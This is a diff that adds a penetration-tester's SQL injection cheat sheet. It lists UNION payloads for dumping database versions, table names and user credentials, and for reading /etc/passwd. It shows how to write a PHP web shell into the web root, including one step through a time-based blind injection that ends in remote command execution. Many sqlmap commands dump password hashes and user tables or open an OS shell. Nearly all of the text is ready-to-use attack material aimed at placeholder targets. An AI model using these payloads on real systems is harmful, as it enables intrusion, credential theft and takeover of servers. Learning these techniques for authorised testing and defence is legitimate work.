@@ -1,0 +1,143 @@
+SQL Injection
+
+
+SQL databases interpret the single quote character as the boundary between code and data. It assumes 
+that anything following a single quote is code that it needs to run and anything encapsulated by a 
+quote is data.
+
+Check for SQLi by adding the following to the end of a URL:
+a single quote
+' or 1=1--<space>
+' order by 1-- -
+'union select 1,2,3,4,5,6,7,8-- -
+'union select 1,2,3,@@version,5,6,7,8-- -
+'union select 1,2,3,user(),5,6,7,8-- -
+'union select 1,2,3,database(),5,6,7,8-- -
+'union select 1,2,3,table_name,5,6,7,8 from information_schema.tables-- -
+
+'union select 1,2,3,load_file('/etc/passwd'),5,6,7,8-- -
+'union select 1,2,3,'hello testing out file',5,6,7,8 into outfile '/var/www/test'-- - ( Insert File ) 
+'union select 1,2,3,load_file('/var/www/test'),5,6,7,8-- -  ( Check File )
+'union select null,null,null,"<?php system($_GET['cmd']);?>",5,6,7,8 into outfile '/var/www/shell.php'-- - (Insert File )
+'union select null,null,null,load_file('/var/www/shell.php'),5,6,7,8-- - ( Check File )
+
+
+'union select 1,2,3,column_name,5,6,7,8 from information_schema.columns where table_name='users'-- -
+'union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_name='users'-- -
+
+
+Return Result = user_id,first_name,last_name,email,pass,user_level,active,registration_date
+
+'union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a,pass,0x3a,user_level),5,6,7,8 from users-- -
+
+
+http://www.target.com/index.php?id=100'
+http://www.target.com/index.php?id=100' or 1=1--<space>
+
+http://target.com/user.php?name=admin&password=summer2016
+http://target.com/user.php?name=admin' or 1=1-- &password=summer2016
+------------------------------------------------------------------------------------------------------
+
+?sql_query 
+
+If you are reading the source code for a web page and discover ?sql_query in the code, this format is 
+how HTTP GET parameters are passed through the URL. You can inject an SQL query as a HTTP GET parameter 
+to a server-side script. Based on prior knowledge of a database table name (customers), you can inject 
+a properly formatted SQL query as a HTTP GET parameter.
+
+http://www.target.com/index.php?sql_query=SELECT * FROM customers
+------------------------------------------------------------------------------------------------------
+
+# Remote code execution via time based blind SQLi
+
+- The 'title' parameter is vulnerable.
+http://target.com/item.php?title=1&action=search
+
+- Try a time based attack.
+http://target.com/item.php?title='%2b(SELECT+1+FROM+(SELECT+SLEEP(10))A)%2b'&action=search
+
+- Inject a PHP shell.
+http://target.com/item.php?title=a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/shell.php" -- -&action=search
+
+- Run a command.
+http://target.com/shell.php?cmd=id
+------------------------------------------------------------------------------------------------------
+
+sqlmap
+
+-u                 Target URL.
+--random-agent     Use randomly selected HTTP User-Agent header value.
+--dbms=value       Force back-end DBMS to this value (MSSQL, MySQL, Oracle).
+--level=#          Level of tests to perform (1-5, default 1).
+--risk=#           Risk of tests to perform (1-3, default 1).
+-b                 Retrieve DBMS banner.
+--passwords        Enumerate DBMS users password hashes.
+--crawl=#          Crawl the website starting from the target URL.
+--forms            Parse and test forms on target URL.
+
+sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10 --forms
+------------------------------------------------------------------------------------------------------
+
+Use Burp to trap a request. Copy the request to /root/tmp.
+
+sqlmap.py -r /root/tmp --banner                                              Show webserver OS, apps and db
+sqlmap.py -r /root/tmp --dbms=<db type> --dbs                                Show all dbs available
+sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> --current-user        Show the user the web server is using to talk to the db
+sqlmap.py -r /root/tmp --dbms=<db type> -p <parameter> -U <user> --passwords
+sqlmap.py -r /root/tmp --dbms=<db type> -D <database> --tables               Show all tables in a db
+sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --columns   Show all columns in a table
+sqlmap.py -r /root/tmp --dbms=<db type> -D <database> -T <table> --dump      Show all data in a table     
+
+Example
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --dbs
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa --tables
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#'
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users --columns
+
+sqlmap.py -u 'http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' 
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users -C user_id,user,password --dump
+
+sqlmap.py -u 'http://target.com/login.asp' --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell
+
+
+
+SQLMAP
+======
+
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p add_value –dbs
+
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --batch
+
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --dbs
+
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id --tables -D gallery --columns
+
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id --tables -D gallery -C username,password –dump 
+
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump
+
+sqlmap -u "http://XX.XX.XX.XX/checklogin.php" --dbms=MySQL  --data="myusername=username&mypassword=password" --level=5 --risk=3  --dbs
+
+sqlmap -u "http://XX.XX.XX.XX/checklogin.php" --dbms=MySQL  --data="myusername=username&mypassword=password" --level=5 --risk=3  --tables -D members
+
+sqlmap -u "http://XX.XX.XX.XX/checklogin.php" --data="myusername=username&mypassword=password"  -D members -T members --dump
+
+OTHER
+=====
+http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,2,3,4,5,6--
+
+http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,version(),3,4,5,6--
+
+http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--
+
+http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=CHAR(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)--
+
+http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,group_concat(username,0x3a,password),3,4,5,6 From dev_accounts--
+
